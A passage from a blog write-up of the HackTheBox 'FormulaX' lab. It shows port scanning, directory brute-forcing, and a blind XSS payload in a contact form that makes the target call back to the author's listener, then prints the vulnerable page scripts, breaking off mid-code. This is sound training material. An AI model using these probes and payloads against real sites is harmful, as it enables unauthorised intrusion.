<!doctype html><html lang=en><head><title>HTB FormulaX WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'FormulaX' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB FormulaX WriteUp"><meta name=twitter:description content="HackThebox 'FormulaX' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/formulax/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB FormulaX WriteUp"><meta property="og:description" content="HackThebox 'FormulaX' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-17T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-17T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Hard"><meta property="article:tag" content="Xss"><meta property="article:tag" content="Gobuster"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/formulax/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/formulax/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/formulax/>HTB FormulaX WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-17T00:00:00Z>17 August, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
20-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/hard/>Hard</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/xss/>Xss</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/gobuster/>Gobuster</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/curl/>Curl</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/socket.io/>Socket.io</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/simple-git/>Simple-Git</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/local-port-forwarding/>Local Port Forwarding</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/php/>Php</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/mongodb/>Mongodb</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/librenms/>Librenms</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/blade/>Blade</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/laravel/>Laravel</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/libre-office/>Libre Office</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/exploit-db/>Exploit-Db</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/sudo/>Sudo</a></span></div></div></header><div class=post-content><h1 id=formulax----hackthebox>FormulaX &ndash; HackTheBox
<a class=heading-link href=#formulax----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Hard</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;FormulaX&rsquo; Avatar" src=/pentesting/images/FormulaX_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>FormulaX</code> is a Hard machine, based on <code>Linux</code>, from <code>HackTheBox</code> platform. After an initial scan, we see that the site is running a webpage. This webpage allows us to create a user. After creating it, we see that a &ldquo;Contact Us&rdquo; form is vulnerable to <code>Cross Site Scripting</code> (<code>XSS</code>), which allows us to discover a new subdomain/virtual host. This new subdomain is running a vulnerable <code>simple-git</code> version, which allows us to gain initial access to the target machine. Once inside, we see that the target machine is also running a <code>MongoDB</code> database. Inside this database we are able to extract users and password hashes, which we are able to crack through a <code>Brute Force Password Cracking</code> along with <code>rockyou.txt</code> dictionary. We obtain credentials for a first user that is able to connect via <code>SSH</code>. Once inside the machine as this new user, we see that the victim machine is also running <code>LibreNMS</code> on an internal port and our new user is able to create a new &ldquo;admin&rdquo; user within <code>LibreNMS</code> portal. Inside <code>LibreNMS</code> portal, we are able to inject <code>PHP</code> code and connect as the user who was running <code>LibreNMS</code> service; this user has acces to <code>.env</code> files that leakes the password of a second user. This second user can run a script that starts <code>Libre Office</code> service inside the machine, which can be abused to escalate privileges and become <code>root</code>.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Nmap</code> scan shows only 2 ports open: <code>22</code> <code>SSH</code> and <code>80</code> <code>HTTP</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.6 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 20:10 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.6
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.18s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-cors: GET POST
</span></span></span><span class=line><span class=cl><span class=go>| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
</span></span></span><span class=line><span class=cl><span class=go>|_Requested resource was /static/index.html
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.88 seconds
</span></span></span></code></pre></div><p>Visiting <code>http://10.10.11.6</code> shows a simple page:</p><p><img alt="FormulaX 1" src=/pentesting/images/FormulaX_1.png></p><p>If we create an account now we can see a button that says <code>Chat Now</code>. Clicking on it redirects to <code>http://10.10.11.6/restricted/chat.html</code>. The site apparently presents a chatbot like <code>ChatGPT</code>, but in an ultra-alpha version. We can interact with the bot in a presented chat. However, it only accepts some fixed commands like <code>help</code> or <code>history</code>:</p><p><img alt="FormulaX 2" src=/pentesting/images/FormulaX_2.png></p><p>At the <code>Home Page</code> (<code>http://10.10.11.6/restricted/home.html</code>) we can see a <code>Contact Us</code> button. Clicking on it redirects us to <code>http://10.10.11.6/restricted/contact_us.html</code> shows another panel that can be filled:</p><p><img alt="FormulaX 3" src=/pentesting/images/FormulaX_3.png></p><p>I fill it with random stuff, until I get something- I start a simple <code>netcat</code> listener on port <code>8080</code>, and send the request:</p><p><img alt="FormulaX 4" src=/pentesting/images/FormulaX_4.png></p><p>so, as the body message, we pass the payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>img</span> <span class=nx>src</span><span class=o>=</span><span class=s1>&#39;http://10.10.16.2:8080/test&#39;</span><span class=o>&gt;</span>
</span></span></code></pre></div><p>where <code>10.10.16.2</code> is my attacker IP.</p><p>Some seconds after sending the payload, I get something in my <code>netcat</code> listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 8080 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.6] 34080
</span></span></span><span class=line><span class=cl><span class=go>GET /test HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=go>Host: 10.10.16.2:8080
</span></span></span><span class=line><span class=cl><span class=go>Connection: keep-alive
</span></span></span><span class=line><span class=cl><span class=go>Pragma: no-cache
</span></span></span><span class=line><span class=cl><span class=go>Cache-Control: no-cache
</span></span></span><span class=line><span class=cl><span class=go>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/113.0.5672.63 Safari/537.36
</span></span></span><span class=line><span class=cl><span class=go>Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
</span></span></span><span class=line><span class=cl><span class=go>Referer: http://chatbot.htb/
</span></span></span><span class=line><span class=cl><span class=go>Accept-Encoding: gzip, deflate
</span></span></span></code></pre></div><p>so the server is trying to get a resource. We find that this form is vulnerable to <code>Cross Site Scripting</code> (<code>XSS</code>), and I guess that is the hint that machine name gives: <code>FormulaX</code> -> Form vulnerable to <code>XSS</code>.</p><p>I also note that, if we accept multiple request setting a temporal <code>Python</code> <code>HTTP</code> server in the same port, we get multiple requests if we re-send the payload in the <code>Contact Us</code> page:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:16] code 404, message File not found
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:16] &#34;GET /test HTTP/1.1&#34; 404 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:20] code 404, message File not found
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:20] &#34;GET /test HTTP/1.1&#34; 404 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:22] code 404, message File not found
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:22] &#34;GET /test HTTP/1.1&#34; 404 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:26] code 404, message File not found
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 20:54:26] &#34;GET /test HTTP/1.1&#34; 404 -
</span></span></span></code></pre></div><p>Now the hard part is to somehow read data using these requests to an endpoint inside the machine. Looking for <code>HTML</code> and <code>JavaScript</code> files in <code>/restricted</code> directory with <code>Gobuster</code> we find some files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.6/restricted -t 55 -x html,js
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://10.10.11.6/restricted
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              js,html
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/about.html           (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/home.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/contact_us.html      (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/contact_us.js        (Status: 200) [Size: 1057]
</span></span></span><span class=line><span class=cl><span class=go>/Home.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/chat.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/chat.js              (Status: 200) [Size: 1491]
</span></span></span><span class=line><span class=cl><span class=go>/About.html           (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/Contact_Us.html      (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/Chat.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/HOME.html            (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/Contact_us.html      (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/changePassword.html  (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/changepassword.html  (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/changepassword.js    (Status: 200) [Size: 1084]
</span></span></span><span class=line><span class=cl><span class=go>/ABOUT.html           (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>/ChangePassword.html  (Status: 200) [Size: 46]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 661680 / 661683 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>where we find some <code>.js</code> files.</p><p>Analyzing <code>http://10.10.11.6/restricted/contact_us.js</code> shows the code that allows the <code>XSS</code> payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// A function that handles the submit request of the user
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>handleRequest</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>first_name</span> <span class=o>=</span> <span class=kr>await</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;first_name&#39;</span><span class=p>).</span><span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>last_name</span> <span class=o>=</span> <span class=kr>await</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;last_name&#39;</span><span class=p>).</span><span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>message</span> <span class=o>=</span> <span class=kr>await</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>).</span><span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=nx>axios</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=sb>`/user/api/contact_us`</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;first_name&#34;</span><span class=o>:</span> <span class=nx>first_name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;last_name&#34;</span><span class=o>:</span> <span class=nx>last_name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;message&#34;</span><span class=o>:</span> <span class=nx>message</span>
</span></span><span class=line><span class=cl>        <span class=p>}).</span><span class=nx>then</span><span class=p>((</span><span class=nx>response</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;first_name&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;last_name&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// here we are gonna show the error
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>).</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>response</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>Message</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Something went Wrong&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>).</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;Something went Wrong&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>and reviewing <code>/restricted/chat.js</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>let</span> <span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>res</span> <span class=o>=</span> <span class=nx>axios</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=sb>`/user/api/chat`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>socket</span> <span class=o>=</span> <span class=nx>io</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,{</span><span class=nx>withCredentials</span><span class=o>:</span> <span class=kc>true</span><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//listening for the messages
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>socket</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>my_message</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>//console.log(&#34;Received From Server: &#34; + my_message)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nx>Show_messages_on_screen_of_Server</span><span class=p>(</span><span class=nx>my_message</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>typing_chat</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>value</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;user_message&#39;</span><span class=p>).</span><span class=nx>value</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// sending the  messages to the server
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>socket</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s1>&#39;client_message&#39;</span><span class=p>,</span> <span class=nx>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>Show_messages_on_screen_of_Client</span><span class=p>(</span><span class=nx>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// here we will do out socket things..
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;user_message&#39;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Cannot send Empty Messages&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>htmlEncode</span><span class=p>(</span><span class=nx>str</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>String</span><span class=p>(</span><span class=nx>str</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/[^\w. ]/gi</span><span class=p>,</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>c</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&amp;#&#39;</span> <span class=o>+</span> <span class=nx>c</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>Show_messages_on_screen_of_Server</span> <span class=o>=</span> <span class=p>(</span><span class=nx>value</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>div</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;div&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s1>&#39;container&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=sb>`  
</span></span></span><span class=line><span class=cl><span class=sb>  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
</span></span></span><span class=line><span class=cl><span class=sb>    &lt;p&gt;</span><span class=si>${</span><span class=nx>value</span><span class=si>}</span><span class=sb>&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=sb>  `</span>
</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;big_container&#39;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// send the input to the chat forum
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>Show_messages_on_screen_of_Client</span> <span class=o>=</span> <span class=p>(</span><span class=nx>value</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>value</span> <span class=o>=</span> <span class=nx>htmlEncode</span><span class=p>(</span><span class=nx>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>div</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;div&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s1>&#39;container&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s1>&#39;darker&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=sb>`  
</span></span></span><span class=line><span class=cl><span class=sb>  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
</span></span></span><span class=line><span class=cl><span class=sb>      &lt;p&gt;</span><span class=si>${</span><span class=nx>value</span><span class=si>}</span><span class=sb>&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=sb>  `</span>
